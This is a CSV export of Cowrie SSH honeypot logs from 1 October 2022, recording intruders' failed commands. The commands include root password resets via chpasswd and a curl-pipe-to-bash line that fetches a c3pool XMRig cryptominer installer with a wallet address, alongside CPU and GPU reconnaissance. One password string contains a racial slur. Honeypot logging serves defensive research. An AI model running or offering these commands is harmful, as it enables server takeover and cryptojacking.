eventid,username,input,size,compCS,width,outfile,protocol,duration,height,url,keyAlgs,ttylog,data,sensor,arch,session,shasum,message,langCS,timestamp,kexAlgs,encCS,password,version,dst_port,macCS,destfile,client_fingerprint,filename
cowrie.command.failed,,./upnpsetup,,,,,,,,,,,,fet-cowrie,,5bf700d87cc5,,Command not found: ./upnpsetup,,2022-10-01T05:38:02.202125Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,b1bd1ead6722,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:38:14.083831Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,b1bd1ead6722,,Command not found: nvidia-smi,,2022-10-01T05:38:14.086321Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,b1bd1ead6722,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:38:14.088732Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,5535f9b1e5f0,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:38:28.961674Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,a3c8a06257c8,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:38:40.772958Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,a3c8a06257c8,,Command not found: nvidia-smi,,2022-10-01T05:38:40.775713Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,715b7f18b1e4,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:39:00.209708Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,715b7f18b1e4,,Command not found: nvidia-smi,,2022-10-01T05:39:00.212362Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,81688330c3ec,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:39:02.218289Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,81688330c3ec,,Command not found: nvidia-smi,,2022-10-01T05:39:02.220892Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,423d48f5cffa,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:39:03.318474Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,423d48f5cffa,,Command not found: nvidia-smi,,2022-10-01T05:39:03.334071Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,47f2cb28576d,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:39:12.128860Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,47f2cb28576d,,Command not found: nvidia-smi,,2022-10-01T05:39:12.132174Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,f9cadb0f139e,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:39:20.286530Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,f9cadb0f139e,,Command not found: nvidia-smi,,2022-10-01T05:39:20.289537Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,732d5b40347f,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:39:26.785036Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,cda1aa10a7c8,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:39:27.526759Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,cda1aa10a7c8,,Command not found: nvidia-smi,,2022-10-01T05:39:27.529342Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,7213abc21b1b,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:39:29.997833Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,7213abc21b1b,,Command not found: nvidia-smi,,2022-10-01T05:39:30.000505Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,007f92fb70d8,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:01.035822Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,007f92fb70d8,,Command not found: nvidia-smi,,2022-10-01T05:40:01.038484Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,99b970362264,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:04.318319Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,99b970362264,,Command not found: nvidia-smi,,2022-10-01T05:40:04.321270Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,3b2fd19b118a,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:06.380049Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,3b2fd19b118a,,Command not found: nvidia-smi,,2022-10-01T05:40:06.383048Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,682e2a6e185f,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:10.420430Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,682e2a6e185f,,Command not found: nvidia-smi,,2022-10-01T05:40:10.423782Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,94ef9f00ddf5,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:40:14.013939Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,45247c0871ae,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:40:22.223522Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,29b90bf7e0de,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:40:25.662904Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,29b90bf7e0de,,Command not found: nvidia-smi,,2022-10-01T05:40:25.679533Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,1028d0ecc288,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:40:31.599545Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,1028d0ecc288,,Command not found: nvidia-smi,,2022-10-01T05:40:31.602060Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,1028d0ecc288,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:40:31.605333Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,141eba7bc0c4,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:34.790982Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,141eba7bc0c4,,Command not found: nvidia-smi,,2022-10-01T05:40:34.794025Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,df86295b8733,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:39.474712Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,df86295b8733,,Command not found: nvidia-smi,,2022-10-01T05:40:39.477296Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,1a541e0d481a,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:40:43.044942Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,1a541e0d481a,,Command not found: nvidia-smi,,2022-10-01T05:40:43.061570Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,dbf598b54224,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:46.322762Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,dbf598b54224,,Command not found: nvidia-smi,,2022-10-01T05:40:46.325341Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,895d87e47916,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:40:50.213295Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,895d87e47916,,Command not found: nvidia-smi,,2022-10-01T05:40:50.215715Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,833a6004f6e4,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:40:52.178237Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,5abbfd39a8f3,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:40:53.190304Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,5abbfd39a8f3,,Command not found: nvidia-smi,,2022-10-01T05:40:53.192890Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,5abbfd39a8f3,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:40:53.195408Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,57cb973b0eeb,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:40:55.373045Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,bd822a576146,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:41:01.635033Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,bd822a576146,,Command not found: nvidia-smi,,2022-10-01T05:41:01.651536Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,9daac81da24d,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:41:11.184970Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,9daac81da24d,,Command not found: nvidia-smi,,2022-10-01T05:41:11.187538Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,4b75bc7571bc,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:41:18.237806Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,4b75bc7571bc,,Command not found: nvidia-smi,,2022-10-01T05:41:18.254878Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,ecb61468b2c5,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:41:20.112178Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,ecb61468b2c5,,Command not found: nvidia-smi,,2022-10-01T05:41:20.114638Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,2257b356fdf1,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:41:25.379483Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,2257b356fdf1,,Command not found: nvidia-smi,,2022-10-01T05:41:25.382442Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,2257b356fdf1,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:41:25.384828Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,2b2e2d803ff2,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:41:27.051939Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,2b2e2d803ff2,,Command not found: nvidia-smi,,2022-10-01T05:41:27.055054Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,0a7df7d865b0,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:41:29.751732Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,0a7df7d865b0,,Command not found: nvidia-smi,,2022-10-01T05:41:29.754130Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,ab185bd3774a,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:41:36.303728Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,ab185bd3774a,,Command not found: nvidia-smi,,2022-10-01T05:41:36.320513Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,f6322be8526e,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:41:47.442301Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,f6322be8526e,,Command not found: nvidia-smi,,2022-10-01T05:41:47.445127Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,f6322be8526e,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:41:47.447660Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,ab198b097151,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:41:51.446482Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,ab198b097151,,Command not found: nvidia-smi,,2022-10-01T05:41:51.449280Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,4ba4b95cdf75,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:42:50.968806Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,4ba4b95cdf75,,Command not found: nvidia-smi,,2022-10-01T05:42:50.971527Z,,,,,,,,,
cowrie.command.failed,,./upnpsetup,,,,,,,,,,,,fet-cowrie,,2129dd0c4457,,Command not found: ./upnpsetup,,2022-10-01T05:42:52.010058Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,adcd6ed53714,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:42:53.226850Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,adcd6ed53714,,Command not found: nvidia-smi,,2022-10-01T05:42:53.230349Z,,,,,,,,,
cowrie.command.failed,,echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,90fa66e74d00,,Command not found: echo root:d9s23491e319s12212246jti6u3j6ig23r3 | chpasswd | bash,,2022-10-01T05:42:54.096514Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,90fa66e74d00,,Command not found: nvidia-smi,,2022-10-01T05:42:54.111592Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,22830cf96850,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:42:54.833709Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,22830cf96850,,Command not found: nvidia-smi,,2022-10-01T05:42:54.836134Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,94f3d83a833a,,Command not found: nvidia-smi,,2022-10-01T05:42:56.882335Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,94f3d83a833a,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:42:56.884669Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,efc8c00c145f,,Command not found: nvidia-smi,,2022-10-01T05:42:59.597688Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,efc8c00c145f,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:42:59.600072Z,,,,,,,,,
cowrie.command.failed,,./upnpsetup,,,,,,,,,,,,fet-cowrie,,d02e056c0f18,,Command not found: ./upnpsetup,,2022-10-01T05:43:03.312111Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,bf0c2b6aa53e,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:43:12.927166Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,bf0c2b6aa53e,,Command not found: nvidia-smi,,2022-10-01T05:43:12.930744Z,,,,,,,,,
cowrie.command.failed,,cat /proc/cpuinfo | grep name | wc -l,,,,,,,,,,,,fet-cowrie,,f16bb0ef2a2f,,Command not found: cat /proc/cpuinfo | grep name | wc -l,,2022-10-01T05:43:14.021746Z,,,,,,,,,
cowrie.command.failed,,echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,7ee07e2af654,,Command not found: echo root:xmrFlocckaD1onITdamnniggawoahagain | chpasswd | bash,,2022-10-01T05:43:18.177939Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,7ee07e2af654,,Command not found: nvidia-smi,,2022-10-01T05:43:18.180468Z,,,,,,,,,
cowrie.command.failed,,curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,,,,,,,,,,,fet-cowrie,,7ee07e2af654,,Command not found: curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 458YJv4nmko9qR4LA8gP7ED7gV4XUiQCFeGoM7No51UJUxYBr3ExREgKWfUkRCoJxNJTUcpmnTYqV7VnWApFfc7o49S1VS1,,2022-10-01T05:43:18.182953Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,c12fb249e830,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:43:30.912081Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,c12fb249e830,,Command not found: nvidia-smi,,2022-10-01T05:43:30.914658Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,d40e87b69937,,Command not found: nvidia-smi,,2022-10-01T05:43:33.697016Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,d40e87b69937,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:43:33.699684Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,4c7f1a36b88c,,Command not found: nvidia-smi,,2022-10-01T05:43:34.457087Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,4c7f1a36b88c,,Command not found: echo root:ds234e31s223tij24j4hgg7717ji1rg | chpasswd | bash,,2022-10-01T05:43:34.459808Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,43964b27549b,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:43:35.008641Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,43964b27549b,,Command not found: nvidia-smi,,2022-10-01T05:43:35.011404Z,,,,,,,,,
cowrie.command.failed,,echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,,,,,,,,,,,fet-cowrie,,99710df530d2,,Command not found: echo root:ds234e31s123tij24jtiu233g4ji3rgg | chpasswd | bash,,2022-10-01T05:43:37.825948Z,,,,,,,,,
cowrie.command.failed,,nvidia-smi,,,,,,,,,,,,fet-cowrie,,99710df530d2,,Command not found: nvidia-smi,,2022-10-01T05:43:37.828579Z,,,,,,,,,
